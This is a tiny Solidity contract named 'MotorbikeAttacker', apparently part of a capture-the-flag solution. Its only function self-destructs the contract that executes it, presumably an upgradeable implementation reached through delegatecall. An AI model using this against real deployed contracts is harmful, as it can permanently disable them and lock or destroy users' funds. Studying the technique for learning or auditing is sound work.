// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract MotorbikeAttacker {
    function destruct() external {
        selfdestruct(payable(msg.sender));
    }
}
